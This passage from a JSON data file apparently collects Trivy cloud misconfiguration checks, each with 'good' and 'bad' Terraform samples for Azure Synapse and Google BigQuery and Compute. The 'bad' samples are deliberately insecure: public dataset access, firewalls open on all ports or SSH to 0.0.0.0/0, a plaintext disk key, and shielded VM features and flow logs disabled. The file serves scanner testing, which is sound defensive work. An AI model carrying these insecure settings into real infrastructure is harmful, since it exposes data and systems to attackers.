              "resource \"azurerm_synapse_workspace\" \"good_example\" {\n  name                                 = \"example\"\n  resource_group_name                  = azurerm_resource_group.example.name\n  location                             = azurerm_resource_group.example.location\n  storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n  managed_virtual_network_enabled      = true\n}"
            ],
            "bad": [
              "resource \"azurerm_synapse_workspace\" \"bad_example\" {\n  name                                 = \"example\"\n  resource_group_name                  = azurerm_resource_group.example.name\n  location                             = azurerm_resource_group.example.location\n  storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n  managed_virtual_network_enabled      = false\n}"
            ]
          }
        }
      }
    ],
    "terraform_google": [
      {
        "rule_id": "GOOGLE-BIGQUERY-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "google",
        "service": "bigquery",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/bigquery_dataset#special_group\n  good:\n    - |-\n      resource \"google_bigquery_dataset\" \"good_example\" {\n        dataset_id                  = \"example_dataset\"\n        friendly_name               = \"test\"\n        location                    = \"EU\"\n        default_table_expiration_ms = 3600000\n      }\n  bad:\n    - |-\n      resource \"google_bigquery_dataset\" \"bad_example\" {\n        dataset_id                  = \"example_dataset\"\n        friendly_name               = \"test\"\n        location                    = \"EU\"\n        default_table_expiration_ms = 3600000\n\n        access {\n          role          = \"OWNER\"\n          special_group = \"allAuthenticatedUsers\"\n        }\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/bigquery/no_public_access.yaml",
        "local_path": "google/bigquery/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/bigquery_dataset#special_group"
            ],
            "good": [
              "resource \"google_bigquery_dataset\" \"good_example\" {\n  dataset_id                  = \"example_dataset\"\n  friendly_name               = \"test\"\n  location                    = \"EU\"\n  default_table_expiration_ms = 3600000\n}"
            ],
            "bad": [
              "resource \"google_bigquery_dataset\" \"bad_example\" {\n  dataset_id                  = \"example_dataset\"\n  friendly_name               = \"test\"\n  location                    = \"EU\"\n  default_table_expiration_ms = 3600000\n\n  access {\n    role          = \"OWNER\"\n    special_group = \"allAuthenticatedUsers\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-DISABLE_ALLOW_ALL_PORTS_FIREWALL_RULE",
        "title": "Disable Allow All Ports Firewall Rule",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#allow\n  good:\n    - |-\n      resource \"google_compute_firewall\" \"good_example\" {\n        name    = \"allow-specific-ports\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"80\", \"443\"]\n        }\n\n        source_ranges = [\"0.0.0.0/0\"]\n        target_tags   = [\"web-servers\"]\n      }\n    - |-\n      resource \"google_compute_firewall\" \"allow-ssh-and-http\" {\n        name    = \"allow-ssh-and-http\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"22\", \"80\"]\n        }\n\n        source_ranges = [\"192.168.1.0/24\"]\n        target_tags   = [\"servers\"]\n      }\n  bad:\n    - |-\n      resource \"google_compute_firewall\" \"bad_example\" {\n        name    = \"allow-all-ports\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"0-65535\"]\n        }\n\n        source_ranges = [\"0.0.0.0/0\"]\n        target_tags   = [\"servers\"]\n      }\n    - |-\n      resource \"google_compute_firewall\" \"allow-all-tcp\" {\n        name    = \"allow-all-tcp\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n        }\n\n        source_ranges = [\"192.168.1.0/24\"]\n        target_tags   = [\"servers\"]\n      }\n",
        "file_name": "disable_allow_all_ports_firewall_rule.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/disable_allow_all_ports_firewall_rule.yaml",
        "local_path": "google/compute/disable_allow_all_ports_firewall_rule.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#allow"
            ],
            "good": [
              "resource \"google_compute_firewall\" \"good_example\" {\n  name    = \"allow-specific-ports\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"80\", \"443\"]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n  target_tags   = [\"web-servers\"]\n}",
              "resource \"google_compute_firewall\" \"allow-ssh-and-http\" {\n  name    = \"allow-ssh-and-http\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\", \"80\"]\n  }\n\n  source_ranges = [\"192.168.1.0/24\"]\n  target_tags   = [\"servers\"]\n}"
            ],
            "bad": [
              "resource \"google_compute_firewall\" \"bad_example\" {\n  name    = \"allow-all-ports\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"0-65535\"]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n  target_tags   = [\"servers\"]\n}",
              "resource \"google_compute_firewall\" \"allow-all-tcp\" {\n  name    = \"allow-all-tcp\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n  }\n\n  source_ranges = [\"192.168.1.0/24\"]\n  target_tags   = [\"servers\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-DISABLE_DEFAULT_FIREWALL_RULE",
        "title": "Disable Default Firewall Rule",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall\n  good:\n    - |-\n      resource \"google_compute_firewall\" \"custom-ssh-access\" {\n        name    = \"custom-ssh-access\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"22\"]\n        }\n\n        source_ranges = [\"192.168.1.0/24\"]\n        target_tags   = [\"ssh-allowed\"]\n      }\n  bad:\n    - |-\n      resource \"google_compute_firewall\" \"default-allow-internal\" {\n        name    = \"default-allow-internal\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"0-65535\"]\n        }\n\n        source_ranges = [\"10.128.0.0/9\"]\n      }\n    - |-\n      resource \"google_compute_firewall\" \"default-allow-ssh\" {\n        name    = \"default-allow-ssh\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"22\"]\n        }\n\n        source_ranges = [\"0.0.0.0/0\"]\n      }\n",
        "file_name": "disable_default_firewall_rule.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/disable_default_firewall_rule.yaml",
        "local_path": "google/compute/disable_default_firewall_rule.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall"
            ],
            "good": [
              "resource \"google_compute_firewall\" \"custom-ssh-access\" {\n  name    = \"custom-ssh-access\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\"]\n  }\n\n  source_ranges = [\"192.168.1.0/24\"]\n  target_tags   = [\"ssh-allowed\"]\n}"
            ],
            "bad": [
              "resource \"google_compute_firewall\" \"default-allow-internal\" {\n  name    = \"default-allow-internal\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"0-65535\"]\n  }\n\n  source_ranges = [\"10.128.0.0/9\"]\n}",
              "resource \"google_compute_firewall\" \"default-allow-ssh\" {\n  name    = \"default-allow-ssh\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\"]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-DISABLE_PORT_RANGE_RULE",
        "title": "Disable Port Range Rule",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#allow\n    - https://cloud.google.com/vpc/docs/using-firewalls\n  good:\n    - |-\n      resource \"google_compute_firewall\" \"good_example_specific_ports\" {\n        name      = \"allow-specific-ports\"\n        network   = \"default\"\n        direction = \"INGRESS\"\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"80\", \"443\", \"8080\"]\n        }\n        source_ranges = [\"0.0.0.0/0\"]\n      }\n    - |-\n      resource \"google_compute_firewall\" \"good_example_small_range\" {\n        name      = \"allow-small-range\"\n        network   = \"default\"\n        direction = \"INGRESS\"\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"8000-8010\"] # 10 ports\n        }\n        source_ranges = [\"10.0.0.0/16\"]\n      }\n  bad:\n    - |-\n      resource \"google_compute_firewall\" \"bad_example_large_range\" {\n        name      = \"allow-large-range\"\n        network   = \"default\"\n        direction = \"INGRESS\"\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"8000-8050\"] # 50 ports (exceeds threshold)\n        }\n        source_ranges = [\"0.0.0.0/0\"]\n      }\n    - |-\n      resource \"google_compute_firewall\" \"bad_example_just_over_threshold\" {\n        name      = \"allow-just-over-threshold\"\n        network   = \"default\"\n        direction = \"INGRESS\"\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"8000-8031\"] # 31 ports (just over threshold)\n        }\n        source_ranges = [\"192.168.1.0/24\"]\n      }\n",
        "file_name": "disable_port_range_rule.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/disable_port_range_rule.yaml",
        "local_path": "google/compute/disable_port_range_rule.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#allow",
              "https://cloud.google.com/vpc/docs/using-firewalls"
            ],
            "good": [
              "resource \"google_compute_firewall\" \"good_example_specific_ports\" {\n  name      = \"allow-specific-ports\"\n  network   = \"default\"\n  direction = \"INGRESS\"\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"80\", \"443\", \"8080\"]\n  }\n  source_ranges = [\"0.0.0.0/0\"]\n}",
              "resource \"google_compute_firewall\" \"good_example_small_range\" {\n  name      = \"allow-small-range\"\n  network   = \"default\"\n  direction = \"INGRESS\"\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"8000-8010\"] # 10 ports\n  }\n  source_ranges = [\"10.0.0.0/16\"]\n}"
            ],
            "bad": [
              "resource \"google_compute_firewall\" \"bad_example_large_range\" {\n  name      = \"allow-large-range\"\n  network   = \"default\"\n  direction = \"INGRESS\"\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"8000-8050\"] # 50 ports (exceeds threshold)\n  }\n  source_ranges = [\"0.0.0.0/0\"]\n}",
              "resource \"google_compute_firewall\" \"bad_example_just_over_threshold\" {\n  name      = \"allow-just-over-threshold\"\n  network   = \"default\"\n  direction = \"INGRESS\"\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"8000-8031\"] # 31 ports (just over threshold)\n  }\n  source_ranges = [\"192.168.1.0/24\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-DISK_ENCRYPTION_CUSTOMER_KEY",
        "title": "Disk Encryption Customer Key",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link\n  good:\n    - |-\n      resource \"google_compute_disk\" \"good_example\" {\n        name                      = \"test-disk\"\n        type                      = \"pd-ssd\"\n        zone                      = \"us-central1-a\"\n        image                     = \"debian-9-stretch-v20200805\"\n        physical_block_size_bytes = 4096\n        disk_encryption_key {\n          kms_key_self_link = \"something\"\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_disk\" \"bad_example\" {\n        name                      = \"test-disk\"\n        type                      = \"pd-ssd\"\n        zone                      = \"us-central1-a\"\n        image                     = \"debian-9-stretch-v20200805\"\n        physical_block_size_bytes = 4096\n      }\n",
        "file_name": "disk_encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/disk_encryption_customer_key.yaml",
        "local_path": "google/compute/disk_encryption_customer_key.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link"
            ],
            "good": [
              "resource \"google_compute_disk\" \"good_example\" {\n  name                      = \"test-disk\"\n  type                      = \"pd-ssd\"\n  zone                      = \"us-central1-a\"\n  image                     = \"debian-9-stretch-v20200805\"\n  physical_block_size_bytes = 4096\n  disk_encryption_key {\n    kms_key_self_link = \"something\"\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_disk\" \"bad_example\" {\n  name                      = \"test-disk\"\n  type                      = \"pd-ssd\"\n  zone                      = \"us-central1-a\"\n  image                     = \"debian-9-stretch-v20200805\"\n  physical_block_size_bytes = 4096\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-DISK_ENCRYPTION_NO_PLAINTEXT_KEY",
        "title": "Disk Encryption No Plaintext Key",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link\n  good:\n    - |-\n      resource \"google_compute_disk\" \"good_example\" {\n        disk_encryption_key {\n          kms_key_self_link = google_kms_crypto_key.my_crypto_key.id\n        }\n      }\n    - |-\n      resource \"google_compute_instance\" \"bad_example\" {\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-11\"\n            source_snapshot_encryption_key {\n              kms_key_self_link = google_kms_crypto_key.my_crypto_key.id\n            }\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_disk\" \"bad_example\" {\n        disk_encryption_key {\n          raw_key = \"b2ggbm8gdGhpcyBpcyBiYWQ=\"\n        }\n      }\n    - |-\n      resource \"google_compute_instance\" \"bad_example\" {\n        boot_disk {\n          disk_encryption_key_raw = \"b2ggbm8gdGhpcyBpcyBiYWQ=\"\n        }\n      }\n    - |-\n      resource \"google_compute_instance\" \"bad_example\" {\n        attached_disk {\n          disk_encryption_key_raw = \"b2ggbm8gdGhpcyBpcyBiYWQ=\"\n        }\n      }\n",
        "file_name": "disk_encryption_no_plaintext_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/disk_encryption_no_plaintext_key.yaml",
        "local_path": "google/compute/disk_encryption_no_plaintext_key.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link"
            ],
            "good": [
              "resource \"google_compute_disk\" \"good_example\" {\n  disk_encryption_key {\n    kms_key_self_link = google_kms_crypto_key.my_crypto_key.id\n  }\n}",
              "resource \"google_compute_instance\" \"bad_example\" {\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-11\"\n      source_snapshot_encryption_key {\n        kms_key_self_link = google_kms_crypto_key.my_crypto_key.id\n      }\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_disk\" \"bad_example\" {\n  disk_encryption_key {\n    raw_key = \"b2ggbm8gdGhpcyBpcyBiYWQ=\"\n  }\n}",
              "resource \"google_compute_instance\" \"bad_example\" {\n  boot_disk {\n    disk_encryption_key_raw = \"b2ggbm8gdGhpcyBpcyBiYWQ=\"\n  }\n}",
              "resource \"google_compute_instance\" \"bad_example\" {\n  attached_disk {\n    disk_encryption_key_raw = \"b2ggbm8gdGhpcyBpcyBiYWQ=\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-ENABLE_SHIELDED_VM_IM",
        "title": "Enable Shielded Vm Im",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm\n  good:\n    - |-\n      resource \"google_compute_instance\" \"good_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        shielded_instance_config {\n          enable_integrity_monitoring = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_instance\" \"bad_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        shielded_instance_config {\n          enable_integrity_monitoring = false\n        }\n      }\n",
        "file_name": "enable_shielded_vm_im.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/enable_shielded_vm_im.yaml",
        "local_path": "google/compute/enable_shielded_vm_im.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm"
            ],
            "good": [
              "resource \"google_compute_instance\" \"good_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  shielded_instance_config {\n    enable_integrity_monitoring = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_instance\" \"bad_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  shielded_instance_config {\n    enable_integrity_monitoring = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-ENABLE_SHIELDED_VM_SB",
        "title": "Enable Shielded Vm Sb",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_secure_boot\n  good:\n    - |-\n      resource \"google_compute_instance\" \"good_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        shielded_instance_config {\n          enable_secure_boot = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_instance\" \"bad_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        shielded_instance_config {\n          enable_secure_boot = false\n        }\n      }\n",
        "file_name": "enable_shielded_vm_sb.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/enable_shielded_vm_sb.yaml",
        "local_path": "google/compute/enable_shielded_vm_sb.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_secure_boot"
            ],
            "good": [
              "resource \"google_compute_instance\" \"good_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  shielded_instance_config {\n    enable_secure_boot = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_instance\" \"bad_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  shielded_instance_config {\n    enable_secure_boot = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-ENABLE_SHIELDED_VM_VTPM",
        "title": "Enable Shielded Vm Vtpm",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm\n  good:\n    - |-\n      resource \"google_compute_instance\" \"good_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        shielded_instance_config {\n          enable_vtpm = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_instance\" \"bad_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        shielded_instance_config {\n          enable_vtpm = false\n        }\n      }\n",
        "file_name": "enable_shielded_vm_vtpm.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/enable_shielded_vm_vtpm.yaml",
        "local_path": "google/compute/enable_shielded_vm_vtpm.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm"
            ],
            "good": [
              "resource \"google_compute_instance\" \"good_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  shielded_instance_config {\n    enable_vtpm = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_instance\" \"bad_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  shielded_instance_config {\n    enable_vtpm = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-ENABLE_SUBNETWORK_FLOW_LOGS",
        "title": "Enable Subnetwork Flow Logs",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork#enable_flow_logs\n  good:\n    - |-\n      resource \"google_compute_subnetwork\" \"good_example_with_log_config\" {\n        name          = \"test-subnetwork\"\n        ip_cidr_range = \"10.2.0.0/16\"\n        region        = \"us-central1\"\n        network       = google_compute_network.custom-test.id\n        log_config {\n          aggregation_interval = \"INTERVAL_10_MIN\"\n          flow_sampling        = 0.5\n          metadata             = \"INCLUDE_ALL_METADATA\"\n        }\n      }\n      resource \"google_compute_network\" \"custom-test\" {\n        name                    = \"test-network\"\n        auto_create_subnetworks = false\n      }\n  bad:\n    - |-\n      resource \"google_compute_subnetwork\" \"bad_example\" {\n        name             = \"test-subnetwork\"\n        ip_cidr_range    = \"10.2.0.0/16\"\n        region           = \"us-central1\"\n        network          = google_compute_network.custom-test.id\n        enable_flow_logs = false\n      }\n      resource \"google_compute_network\" \"custom-test\" {\n        name                    = \"test-network\"\n        auto_create_subnetworks = false\n      }\n    - |-\n      resource \"google_compute_subnetwork\" \"bad_example_no_flow_logs\" {\n        name          = \"test-subnetwork\"\n        ip_cidr_range = \"10.2.0.0/16\"\n        region        = \"us-central1\"\n        network       = google_compute_network.custom-test.id\n      }\n      resource \"google_compute_network\" \"custom-test\" {\n        name                    = \"test-network\"\n        auto_create_subnetworks = false\n      }\n",
        "file_name": "enable_subnetwork_flow_logs.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/enable_subnetwork_flow_logs.yaml",
        "local_path": "google/compute/enable_subnetwork_flow_logs.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork#enable_flow_logs"
            ],
            "good": [
              "resource \"google_compute_subnetwork\" \"good_example_with_log_config\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n  log_config {\n    aggregation_interval = \"INTERVAL_10_MIN\"\n    flow_sampling        = 0.5\n    metadata             = \"INCLUDE_ALL_METADATA\"\n  }\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}"
            ],
            "bad": [
              "resource \"google_compute_subnetwork\" \"bad_example\" {\n  name             = \"test-subnetwork\"\n  ip_cidr_range    = \"10.2.0.0/16\"\n  region           = \"us-central1\"\n  network          = google_compute_network.custom-test.id\n  enable_flow_logs = false\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}",
              "resource \"google_compute_subnetwork\" \"bad_example_no_flow_logs\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-ENABLE_SUBNETWORK_PRIVATE_GOOGLE_ACCESS",
        "title": "Enable Subnetwork Private Google Access",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork#private_ip_google_access\n  good:\n    - |-\n      resource \"google_compute_subnetwork\" \"good_example\" {\n        name                     = \"test-subnetwork\"\n        ip_cidr_range            = \"10.2.0.0/16\"\n        region                   = \"us-central1\"\n        network                  = google_compute_network.custom-test.id\n        private_ip_google_access = true\n      }\n      resource \"google_compute_network\" \"custom-test\" {\n        name                    = \"test-network\"\n        auto_create_subnetworks = false\n      }\n  bad:\n    - |-\n      resource \"google_compute_subnetwork\" \"bad_example\" {\n        name                     = \"test-subnetwork\"\n        ip_cidr_range            = \"10.2.0.0/16\"\n        region                   = \"us-central1\"\n        network                  = google_compute_network.custom-test.id\n        private_ip_google_access = false\n      }\n      resource \"google_compute_network\" \"custom-test\" {\n        name                    = \"test-network\"\n        auto_create_subnetworks = false\n      }\n    - |-\n      resource \"google_compute_subnetwork\" \"bad_example_unspecified\" {\n        name          = \"test-subnetwork\"\n        ip_cidr_range = \"10.2.0.0/16\"\n        region        = \"us-central1\"\n        network       = google_compute_network.custom-test.id\n      }\n      resource \"google_compute_network\" \"custom-test\" {\n        name                    = \"test-network\"\n        auto_create_subnetworks = false\n      }\n",
        "file_name": "enable_subnetwork_private_google_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/enable_subnetwork_private_google_access.yaml",
        "local_path": "google/compute/enable_subnetwork_private_google_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork#private_ip_google_access"
            ],
            "good": [
              "resource \"google_compute_subnetwork\" \"good_example\" {\n  name                     = \"test-subnetwork\"\n  ip_cidr_range            = \"10.2.0.0/16\"\n  region                   = \"us-central1\"\n  network                  = google_compute_network.custom-test.id\n  private_ip_google_access = true\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}"
            ],
            "bad": [
              "resource \"google_compute_subnetwork\" \"bad_example\" {\n  name                     = \"test-subnetwork\"\n  ip_cidr_range            = \"10.2.0.0/16\"\n  region                   = \"us-central1\"\n  network                  = google_compute_network.custom-test.id\n  private_ip_google_access = false\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}",
              "resource \"google_compute_subnetwork\" \"bad_example_unspecified\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-ENABLE_VPC_FLOW_LOGS",
        "title": "Enable Vpc Flow Logs",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork#enable_flow_logs\n  good:\n    - |-\n      resource \"google_compute_subnetwork\" \"good_example\" {\n        name          = \"test-subnetwork\"\n        ip_cidr_range = \"10.2.0.0/16\"\n        region        = \"us-central1\"\n        network       = google_compute_network.custom-test.id\n        log_config {\n          aggregation_interval = \"INTERVAL_10_MIN\"\n          flow_sampling        = 0.5\n          metadata             = \"INCLUDE_ALL_METADATA\"\n        }\n      }\n      resource \"google_compute_network\" \"custom-test\" {\n        name                    = \"test-network\"\n        auto_create_subnetworks = false\n      }\n    - |-\n      resource \"google_compute_subnetwork\" \"good-example\" {\n        name          = \"test-subnetwork\"\n        ip_cidr_range = \"10.2.0.0/16\"\n        region        = \"us-central1\"\n        purpose       = \"REGIONAL_MANAGED_PROXY\"\n        network       = google_compute_network.custom-test.id\n      }\n      resource \"google_compute_network\" \"custom-test\" {\n        name                    = \"test-network\"\n        auto_create_subnetworks = false\n      }\n  bad:\n    - |-\n      resource \"google_compute_subnetwork\" \"bad_example\" {\n        name          = \"test-subnetwork\"\n        